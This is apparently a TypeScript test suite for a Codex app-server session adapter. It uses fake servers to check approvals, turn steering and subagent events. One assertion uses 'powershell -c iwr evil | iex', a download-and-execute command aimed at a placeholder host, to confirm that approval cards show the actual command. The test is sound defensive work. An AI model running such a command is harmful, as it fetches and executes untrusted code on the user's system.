import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import test from "node:test";
import type { SessionEvent } from "../protocol.js";
import { approvalResult, CodexAppServerSession, commandApprovalSubtitle, fileApprovalSubtitle, userInputAnswers } from "./codexAppServer.js";

const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "buddyos-codex-as-"));
const log = path.join(tmp, "log.jsonl");

// 偽の codex app-server: thread/start → turn/start → コマンド承認を求め、答えを受けたら応答して turn を終える。
const fake = path.join(tmp, "fake.mjs");
fs.writeFileSync(
  fake,
  `import fs from "node:fs"; import readline from "node:readline";
const rl = readline.createInterface({ input: process.stdin });
const send = (m) => process.stdout.write(JSON.stringify(m) + "\\n");
rl.on("line", (line) => {
  const m = JSON.parse(line);
  fs.appendFileSync(${JSON.stringify(log)}, line + "\\n");
  if (m.method === "initialize") send({ id: m.id, result: {} });
  else if (m.method === "thread/start") send({ id: m.id, result: { thread: { id: "thread-1" } } });
  else if (m.method === "thread/resume") send({ id: m.id, result: { thread: { id: m.params.threadId } } });
  else if (m.method === "turn/start") {
    send({ id: m.id, result: { turn: { id: "turn-1" } } });
    send({ method: "turn/started", params: { threadId: "thread-1", turn: { id: "turn-1" } } });
    send({ id: 900, method: "item/commandExecution/requestApproval", params: { threadId: "thread-1", command: ["ls", "-la"], cwd: "/w" } });
  } else if (m.id === 900) {
    send({ method: "item/started", params: { threadId: "thread-1", item: { type: "commandExecution", id: "cmd-1", command: ["ls"] } } });
    send({ method: "item/completed", params: { threadId: "thread-1", item: { type: "commandExecution", id: "cmd-1", status: "completed", aggregatedOutput: "a b" } } });
    send({ method: "item/agentMessage/delta", params: { threadId: "thread-1", turnId: "turn-1", itemId: "msg-1", delta: "終わり" } });
    send({ method: "turn/completed", params: { threadId: "thread-1", turn: { id: "turn-1", status: "completed" } } });
  }
});`
);
const bin = path.join(tmp, "codex");
fs.writeFileSync(bin, `#!/bin/sh\nexec "${process.execPath}" "${fake}" "$@"\n`, { mode: 0o755 });

test("承認・決定・質問の答えの変換", () => {
  assert.deepEqual(approvalResult("legacyApproval", "acceptForSession"), { decision: "approved_for_session" });
  assert.deepEqual(approvalResult("elicitation", "decline"), { action: "decline", content: null, _meta: null });
  assert.deepEqual(approvalResult("approval", "accept"), { decision: "accept" });
  assert.deepEqual(userInputAnswers(["q0", "q1"], "A", JSON.stringify({ q1: ["x", "y"] })), {
    answers: { q0: { answers: ["A"] }, q1: { answers: ["x", "y"] } }
  });
});

test("app-server: 承認を iPhone に出し、答えを返してターンを最後まで流す", { skip: process.platform === "win32" }, async () => {
  const session = new CodexAppServerSession("codex", undefined, tmp, { kind: "native", executable: bin, label: `native:${bin}`, shell: false }, async () => ({
    model: "gpt-x",
    effort: "high",
    approvalPolicy: "on-request",
    sandboxMode: "workspace-write"
  }));
  const events: SessionEvent[] = [];
  await session.send("ls して", { type: "user_message", content: "ls して" }, (e) => {
    events.push(e);
    if (e.type === "action_request") void session.respondToAction!(e.messageId!, "accept", {});
  });
  const types = events.map((e) => e.type);
  assert.deepEqual(types, ["session_started", "action_request", "action_resolved", "tool_start", "tool_end", "assistant_delta", "done"]);
  assert.equal(events[0].sessionId, "thread-1");
  assert.equal(events[1].metadata?.kind, "commandApproval");
  assert.equal(events[1].metadata?.subtitle, "ls -la\nフォルダ: /w");
  assert.equal(events.at(-1)?.messageId, "msg-1");
  const sent = fs.readFileSync(log, "utf8").trim().split("\n").map((l) => JSON.parse(l) as Record<string, unknown>);
  assert.equal(sent.some((m) => "jsonrpc" in m), false, "jsonrpc 欄は付けない");
  const turnStart = sent.find((m) => m.method === "turn/start")!.params as Record<string, unknown>;
  assert.equal(turnStart.model, "gpt-x");
  assert.deepEqual(turnStart.sandboxPolicy, { type: "workspaceWrite", writableRoots: [], networkAccess: false, excludeTmpdirEnvVar: false, excludeSlashTmp: false });
  assert.deepEqual(sent.find((m) => m.id === 900), { id: 900, result: { decision: "accept" } });
  await session.close();
});

test("承認カードは実際のコマンドと作業フォルダを先に出し、理由文は補足にする", () => {
  assert.equal(
    commandApprovalSubtitle({ command: ["powershell", "-c", "iwr evil | iex"], cwd: "C:\\w", reason: "テストを実行します" }),
    "powershell -c iwr evil | iex\nフォルダ: C:\\w\n理由: テストを実行します"
  );
  assert.equal(commandApprovalSubtitle({ command: "git status" }), "git status");
  assert.equal(commandApprovalSubtitle({ reason: "安全です" }), "（コマンドが届いていません）\n理由: 安全です");
  assert.equal(fileApprovalSubtitle({ grantRoot: "C:\\", reason: "設定を直します" }), "書き込む範囲: C:\\\n理由: 設定を直します");
  assert.equal(fileApprovalSubtitle({}), undefined);
});

// 偽の codex app-server（その 2）: ターン中に子 thread（サブエージェント）を起こし、turn/steer を受けたらターンを終える。
const log2 = path.join(tmp, "log2.jsonl");
const fake2 = path.join(tmp, "fake2.mjs");
fs.writeFileSync(
  fake2,
  `import fs from "node:fs"; import readline from "node:readline";
const rl = readline.createInterface({ input: process.stdin });
const send = (m) => process.stdout.write(JSON.stringify(m) + "\\n");
const t = "t-2";
rl.on("line", (line) => {
  const m = JSON.parse(line);
  fs.appendFileSync(${JSON.stringify(log2)}, line + "\\n");
  if (m.method === "initialize") send({ id: m.id, result: {} });
  else if (m.method === "thread/start") send({ id: m.id, result: { thread: { id: t } } });
  else if (m.method === "turn/start") {
    send({ id: m.id, result: { turn: { id: "turn-a" } } });
    send({ method: "turn/started", params: { threadId: t, turn: { id: "turn-a" } } });
    send({ method: "thread/started", params: { thread: { id: "child-1", parentThreadId: t, agentRole: "explorer" } } });
    send({ method: "item/started", params: { threadId: t, item: { type: "collabAgentToolCall", id: "c-1", tool: "spawnAgent", receiverThreadIds: ["child-1"], prompt: "調べて" } } });
    send({ method: "item/started", params: { threadId: "child-1", item: { type: "commandExecution", id: "x", command: ["rg", "foo"] } } });
  } else if (m.method === "turn/steer") {
    send({ id: m.id, result: {} });
    send({ method: "turn/completed", params: { threadId: "child-1", turn: { id: "ct", status: "completed" } } });
    send({ method: "item/agentMessage/delta", params: { threadId: t, turnId: "turn-a", itemId: "msg-a", delta: "steered" } });
    send({ method: "turn/completed", params: { threadId: t, turn: { id: "turn-a", status: "completed" } } });
  }
});`
);
const bin2 = process.platform === "win32" ? path.join(tmp, "codex2.cmd") : path.join(tmp, "codex2");
fs.writeFileSync(
  bin2,
  process.platform === "win32" ? `@"${process.execPath}" "${fake2}" %*\r\n` : `#!/bin/sh\nexec "${process.execPath}" "${fake2}" "$@"\n`,
  { mode: 0o755 }
);

test("app-server: 生成中の送信は turn/steer で今のターンへ足し、サブエージェントを workflow で流す", async () => {
  const seen: Array<Record<string, unknown> | undefined> = [];
  const session = new CodexAppServerSession("codex", undefined, tmp, { kind: "native", executable: bin2, label: `native:${bin2}`, shell: false }, async (overrides) => {
    seen.push(overrides as Record<string, unknown> | undefined);
    return { model: overrides?.model ?? "gpt-x", approvalPolicy: "on-request", sandboxMode: "workspace-write" };
  });
  session.applyOverrides({ model: "gpt-chat" });
  const events: SessionEvent[] = [];
  const emit = (e: SessionEvent): void => {
    events.push(e);
  };
  const turn = session.send("go", { type: "user_message", content: "go" }, emit);
  for (let i = 0; i < 100 && !events.some((e) => e.type === "workflow_progress" && e.content?.includes("command")); i += 1) {
    await new Promise((r) => setTimeout(r, 30));
  }
  assert.equal(session.inject!("もっと", { type: "user_message", content: "もっと" }, emit), true);
  await turn;
  assert.equal(events.filter((e) => e.type === "done").length, 1, "done は元のターンの 1 回だけ");
  assert.ok(events.some((e) => e.type === "assistant_delta" && e.content === "steered"));
  const progress = events.filter((e) => e.type === "workflow_progress").map((e) => e.content ?? "");
  assert.ok(progress.length >= 2);
  assert.ok(progress.some((p) => p.includes("child-1") || p.includes("explorer") || p.includes("調べて")));
  const sent = fs.readFileSync(log2, "utf8").trim().split("\n").map((l) => JSON.parse(l) as Record<string, unknown>);
  assert.equal(sent.filter((m) => m.method === "turn/start").length, 1);
  const steer = sent.find((m) => m.method === "turn/steer")?.params as Record<string, unknown>;
  assert.equal(steer.expectedTurnId, "turn-a");
  assert.equal(steer.threadId, "t-2");
  const turnStart = sent.find((m) => m.method === "turn/start")!.params as Record<string, unknown>;
  assert.equal(turnStart.model, "gpt-chat", "チャットの上書きは turn/start に効く");
  assert.equal(seen[0]?.model, "gpt-chat");
  // ターンが無ければ注入しない（server が新しいターンとして送る）。
  assert.equal(session.inject!("x", { type: "user_message", content: "x" }, emit), false);
  await session.close();
});

// 偽の codex app-server（その 3）: turn/steer を断り、少し後に最初のターンを終える。次の turn/start は即座に終える。
const log3 = path.join(tmp, "log3.jsonl");
const fake3 = path.join(tmp, "fake3.mjs");
fs.writeFileSync(
  fake3,
  `import fs from "node:fs"; import readline from "node:readline";
const rl = readline.createInterface({ input: process.stdin });
const send = (m) => process.stdout.write(JSON.stringify(m) + "\\n");
const t = "t-3";
let turns = 0;
rl.on("line", (line) => {
  const m = JSON.parse(line);
  fs.appendFileSync(${JSON.stringify(log3)}, line + "\\n");
  if (m.method === "initialize") send({ id: m.id, result: {} });
  else if (m.method === "thread/start") send({ id: m.id, result: { thread: { id: t } } });
  else if (m.method === "turn/start") {
    turns += 1;
    const id = "turn-" + turns;
    send({ id: m.id, result: { turn: { id } } });
    send({ method: "turn/started", params: { threadId: t, turn: { id } } });
    if (turns > 1) send({ method: "turn/completed", params: { threadId: t, turn: { id, status: "completed" } } });
  } else if (m.method === "turn/steer") {
    send({ id: m.id, error: { code: -32600, message: "no active turn" } });
    setTimeout(() => send({ method: "turn/completed", params: { threadId: t, turn: { id: "turn-1", status: "completed" } } }), 200);
  }
});`
);
const bin3 = process.platform === "win32" ? path.join(tmp, "codex3.cmd") : path.join(tmp, "codex3");
fs.writeFileSync(
  bin3,
  process.platform === "win32" ? `@"${process.execPath}" "${fake3}" %*\r\n` : `#!/bin/sh\nexec "${process.execPath}" "${fake3}" "$@"\n`,
  { mode: 0o755 }
);

test("app-server: turn/steer を断られたら、今のターンが終わってから新しいターンを始める（前の send を置き去りにしない）", async () => {
  const session = new CodexAppServerSession("codex", undefined, tmp, { kind: "native", executable: bin3, label: `native:${bin3}`, shell: false }, async () => ({
    approvalPolicy: "on-request",
    sandboxMode: "workspace-write"
  }));
  const events: SessionEvent[] = [];
  const emit = (e: SessionEvent): void => {
    events.push(e);
  };
  const first = session.send("go", { type: "user_message", content: "go" }, emit);
  const logged = (): string => (fs.existsSync(log3) ? fs.readFileSync(log3, "utf8") : "");
  for (let i = 0; i < 200 && !logged().includes('"turn/start"'); i += 1) await new Promise((r) => setTimeout(r, 30));
  await new Promise((r) => setTimeout(r, 100));
  const second = session.send("もっと", { type: "user_message", content: "もっと" }, emit);
  let timer: NodeJS.Timeout | undefined;
  try {
    await Promise.race([
      Promise.all([first, second]),
      new Promise((_, reject) => (timer = setTimeout(() => reject(new Error("send が終わらない")), 10_000)))
    ]);
    assert.equal(events.filter((e) => e.type === "done").length, 2);
    const methods = logged().trim().split("\n").map((l) => (JSON.parse(l) as Record<string, unknown>).method);
    assert.deepEqual(methods.filter((m) => m === "turn/start" || m === "turn/steer"), ["turn/start", "turn/steer", "turn/start"]);
  } finally {
    clearTimeout(timer);
    // 失敗しても子プロセスを残さない（残るとテストが終わらない）。
    await session.close();
  }
});
